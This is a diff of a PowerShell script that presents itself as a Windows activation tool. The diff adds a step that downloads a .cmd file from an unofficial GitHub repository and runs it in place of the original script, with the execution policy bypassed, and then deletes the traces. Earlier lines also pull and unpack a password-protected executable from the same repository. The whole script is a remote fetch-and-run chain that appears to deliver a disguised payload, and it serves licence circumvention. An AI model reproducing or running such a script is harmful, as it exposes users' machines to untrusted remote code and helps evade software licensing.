@@ -1,4 +1,3 @@
-
 $ErrorActionPreference = "Stop"
 
 # Enable TLSv1.2 for compatibility with older clients for current session
@@ -34,10 +33,13 @@ $FilePath2 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.zip" } else {
 $FilePath3 = if ($isAdmin) { "$env:SystemRoot\Temp\7zr.exe" } else { "$env:TEMP\7zr.exe" }
 $FilePath4 = if ($isAdmin) { "$env:SystemRoot\Temp\" } else { "$env:TEMP\" }
 $FilePath5 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.exe" } else { "$env:TEMP\ActivationWin10.exe" }
+$FilePath6 = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_AIO-CRC32_8C3AA7E0.cmd" } else { "$env:TEMP\MAS_AIO-CRC32_8C3AA7E0.cmd" }
 
 cd $FilePath4
 powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '$FilePath3'"
 powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/HideoutWin/windows/raw/main/ActivationWin10.zip' -OutFile '$FilePath2'; ./7zr.exe x -p@Activation#85320878 ActivationWin10.zip ActivationWin10.exe"
+powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd' -OutFile '$FilePath6'"
+
 
 $ScriptArgs = "$args "
 $prefix = "@::: $rand `r`n"
@@ -46,7 +48,7 @@ Set-Content -Path $FilePath -Value $content
 
 # Set ComSpec variable for current session in case its corrupt in the system
 $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
-Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait
+Start-Process cmd.exe "/c """"$FilePath6"" $ScriptArgs""" -Wait
 
 $FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
